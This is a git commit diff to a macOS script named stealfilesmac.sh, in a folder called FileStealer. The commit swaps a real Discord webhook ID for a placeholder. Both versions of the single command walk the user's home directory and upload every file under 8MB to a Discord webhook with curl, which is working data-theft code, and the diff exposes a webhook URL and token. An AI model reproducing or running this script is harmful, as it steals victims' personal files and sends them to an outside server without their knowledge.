883f2896eaec5b8e6f77342415f1f128a3de7aa7
b4dact0r <rich@murrills.com>
2025-02-18 19:39:07 +0000

    Update stealfilesmac.sh

--- Mac/FileStealer/stealfilesmac.sh
+++ Mac/FileStealer/stealfilesmac.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-find ~/ -type f -name "*.*" -size -8M -maxdepth 3 -exec curl -s -F "file=@{}" "https://discordapp.com/api/webhooks/1339501664410800281/70V-bamgLp3zHqtGCngWbwYc7m2ZiWLf4Km8i6az2fQIwV2_wd55eN7qhyQkbi01dAEP" \;
+find ~/ -type f -name "*.*" -size -8M -maxdepth 3 -exec curl -s -F "file=@{}" "https://discordapp.com/api/webhooks/insertID here/70V-bamgLp3zHqtGCngWbwYc7m2ZiWLf4Km8i6az2fQIwV2_wd55eN7qhyQkbi01dAEP" \;
